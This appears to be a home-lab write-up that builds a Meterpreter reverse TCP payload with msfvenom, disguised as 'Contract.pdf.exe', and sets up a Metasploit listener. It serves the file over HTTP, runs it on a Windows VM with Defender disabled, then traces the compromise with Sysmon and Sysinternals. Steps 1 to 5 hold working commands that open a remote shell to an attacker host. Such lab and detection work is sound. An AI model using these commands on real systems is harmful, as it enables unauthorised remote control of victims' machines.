# Establishing a Reverse TCP Shell via a Malicious Windows Executable

### Disclaimer:
This project is conducted within an isolated virtual lab environment strictly for educational and research purposes. 

### Technologies Used
- Proxmox VE (Virtualization)
- Windows 10 VM (Target system)
- Kali Linux VM (Attacker system)
- pfSense Firewall VM (Network segmentation & security)
- VLANs (Managed via pfSense)
- Sysmon Logs (Advanced system monitoring)
- Sysinternals Suite (Windows forensic tools)

## Step 1: Creating a Malicious Payload with MSFvenom
Generate a Windows executable payload using msfvenom on Kali Linux:  

`msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.10 lport=4444 -f exe -o Contract.pdf.exe`

**Breakdown:**
- `-p windows/x64/meterpreter/reverse_tcp` → Reverse TCP payload
- `LHOST=192.168.10.10` → Attacker's IP address
- `LPORT=4444` → Listening port for the reverse shell
- `-f exe` → Output format (Windows executable)
- `-o Contract.pdf.exe` → Output file name

## Step 2: Setting Up a Listener in Metasploit
Start Metasploit and configure the listener:

`msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.10
set LPORT 4444
exploit`

## Step 3: Hosting the Payload via HTTP
On Kali Linux, create a simple HTTP server to distribute the payload:
- `python3 -m http.server 9999`

## Step 4: Disabling Windows Defender & Downloading the Payload
On the target Windows machine:
1. Disable Real-time Protection in Windows Security
2. Open a web browser and navigate to `http://kali_linux_ip:9999`.
3. Download the `Contract.pdf.exe` file (ignore browser warnings).

## Step 5: Executing the Payload & Establishing a Remote Session
1. Run `Contract.pdf.exe` on the Windows machine.
2. The Metasploit handler captures the reverse shell, and a Meterpreter session is established.

![2025-02-27 17_58_56-proxmox - Proxmox Virtual Environment](https://github.com/user-attachments/assets/0a06cbcf-0ce8-44d9-8617-ca43ebdfdf45)

- Windows shell `meterpreter > shell`
  
![2025-02-27 18_02_54-proxmox - Proxmox Virtual Environment](https://github.com/user-attachments/assets/57bc749a-6de8-42c5-973c-62c07e3d4011)

3. To verify execution, launch the Windows calculator in shell:
- `C:\Windows\System32\calc.exe`

![2025-02-27 18_08_25-QEMU (Win10) - noVNC](https://github.com/user-attachments/assets/ac5b3a3c-feab-40e0-9b8b-83aa0ab936e0)


## Step 6: Analyzing System Logs for Signs of Compromise
Using Sysmon and Sysinternals Suite, investigate malicious activity:

**DNS Query to a Malicious IP (Sysmon Logs)**
- Sysmon logs capture DNS requests to a potential command-and-control (C2) server.
![DNS query (Sysmon)](https://github.com/user-attachments/assets/f7254c2a-693a-4f11-b54f-ab26a473bc04)

**Established Network Connection to Malicious IP (Sysmon Logs)**
- Sysmon detects an outbound network connection to the attacker's system.
![Network connection (Sysmon)](https://github.com/user-attachments/assets/96f33226-9786-4d6c-8ade-a6b769513115)

**Malicious Process Identified via Process Explorer (Sysinternals)**
- Process Explorer reveals Contract.pdf.exe running without a valid signature, communicating with a remote IP.
![Process without signatures (Process Explorer)](https://github.com/user-attachments/assets/9b06302e-b85d-412a-ab1c-36da4344783c)

**TCP Session Analysis via TCPView (Sysinternals)**
- TCPView highlights an active connection to the attacker's system.
![TCP Sessions established (TCPView) ](https://github.com/user-attachments/assets/1da83cdc-dd6e-4ca2-ac17-b11990e98f89)


## Lessons Learned
- Importance of Endpoint Security: Disabling Windows Defender facilitated the attack. A well-configured EDR solution would have detected and blocked the payload.
- Network Monitoring is Critical: Sysmon logs and network monitoring tools can reveal malicious outbound connections, assisting in early threat detection.
- File Integrity and Signature Verification: Untrusted executables should be validated via digital signatures, VirusTotal, and static analysis before execution.
- Segmentation and Least Privilege: Limiting user privileges and enforcing VLAN segmentation can mitigate lateral movement within a compromised network.
- Incident Response Preparedness: Understanding forensic artifacts like Sysmon logs and utilizing Sysinternals tools can help security teams respond effectively to cyber threats.




